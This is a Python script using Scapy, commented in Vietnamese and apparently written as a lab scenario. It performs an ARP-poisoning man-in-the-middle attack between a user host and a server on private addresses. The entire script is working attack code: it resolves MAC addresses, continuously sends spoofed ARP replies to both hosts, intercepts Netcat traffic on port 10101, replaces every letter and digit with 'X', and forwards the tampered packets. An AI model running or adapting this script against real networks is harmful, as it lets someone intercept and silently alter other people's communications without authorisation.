#!/usr/bin/env python3
"""
Kịch bản 3: Tấn công Man-in-the-Middle (MITM) trên kết nối Netcat (Port 10101)
Attacker chặn gói tin Netcat từ User (10.2.6.10) gửi Server (10.2.6.20),
thay thế nội dung (chữ và số thành X) và chuyển tiếp tới Server.
"""
from scapy.all import *
import threading
import time
import re

IP_USER = "10.2.6.10"
IP_SERVER = "10.2.6.20"
PORT = 10101
MAC_ATTACKER = get_if_hwaddr("eth0")

def get_mac(ip):
    for _ in range(3):
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            timeout=2,
            verbose=0,
            iface="eth0",
        )
        for _, rcv in ans:
            return rcv.hwsrc
        time.sleep(0.5)
    raise SystemExit(f"[!] Khong phan giai duoc MAC hien tai cua {ip}")

print(f"[*] Attacker MAC : {MAC_ATTACKER}")
MAC_USER = get_mac(IP_USER)
MAC_SERVER = get_mac(IP_SERVER)

print(f"[*] User   : {IP_USER} -> {MAC_USER}")
print(f"[*] Server : {IP_SERVER} -> {MAC_SERVER}")

def arp_poison():
    # Gui ca unicast va broadcast de dam bao 100% thanh cong tren kernel Linux
    pkts = [
        Ether(src=MAC_ATTACKER, dst=MAC_USER)/ARP(hwsrc=MAC_ATTACKER, psrc=IP_SERVER, hwdst=MAC_USER, pdst=IP_USER, op=2),
        Ether(src=MAC_ATTACKER, dst=MAC_SERVER)/ARP(hwsrc=MAC_ATTACKER, psrc=IP_USER, hwdst=MAC_SERVER, pdst=IP_SERVER, op=2),
        Ether(src=MAC_ATTACKER, dst="ff:ff:ff:ff:ff:ff")/ARP(hwsrc=MAC_ATTACKER, psrc=IP_SERVER, pdst=IP_USER, op=2),
        Ether(src=MAC_ATTACKER, dst="ff:ff:ff:ff:ff:ff")/ARP(hwsrc=MAC_ATTACKER, psrc=IP_USER, pdst=IP_SERVER, op=2)
    ]
    while True:
        sendp(pkts, iface="eth0", verbose=0)
        time.sleep(1.0)

def spoof_pkt(pkt):
    if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
        return

    # Bo qua cac goi tin phat di boi chinh Attacker
    if pkt[Ether].src == MAC_ATTACKER:
        return

    # Huong: User -> Server
    if pkt[IP].src == IP_USER and pkt[IP].dst == IP_SERVER:
        if pkt.haslayer(Raw):
            original_bytes = pkt[Raw].load
            # Thay the toan bo chu cai va chu so thanh 'X'
            modified_bytes = re.sub(rb'[a-zA-Z0-9]', b'X', original_bytes)
            orig_str = original_bytes.decode(errors="ignore").strip()
            mod_str = modified_bytes.decode(errors="ignore").strip()
            print(f"[!] MITM INTERCEPT: '{orig_str}' -> '{mod_str}'", flush=True)

            pkt[Raw].load = modified_bytes
            del pkt[IP].len

        del pkt[IP].chksum
        del pkt[TCP].chksum
        pkt[Ether].src = MAC_ATTACKER
        pkt[Ether].dst = MAC_SERVER
        sendp(pkt, iface="eth0", verbose=0)

    # Huong: Server -> User
    elif pkt[IP].src == IP_SERVER and pkt[IP].dst == IP_USER:
        del pkt[IP].chksum
        del pkt[TCP].chksum
        pkt[Ether].src = MAC_ATTACKER
        pkt[Ether].dst = MAC_USER
        sendp(pkt, iface="eth0", verbose=0)

if __name__ == "__main__":
    print(f"[*] Bat dau MITM giua User ({IP_USER}) va Server ({IP_SERVER}) tren port {PORT}...", flush=True)
    t = threading.Thread(target=arp_poison, daemon=True)
    t.start()
    print("[*] Da kich hoat luong ARP Poisoning song phuong.", flush=True)
    sniff(iface="eth0", filter=f"tcp port {PORT}", prn=spoof_pkt)
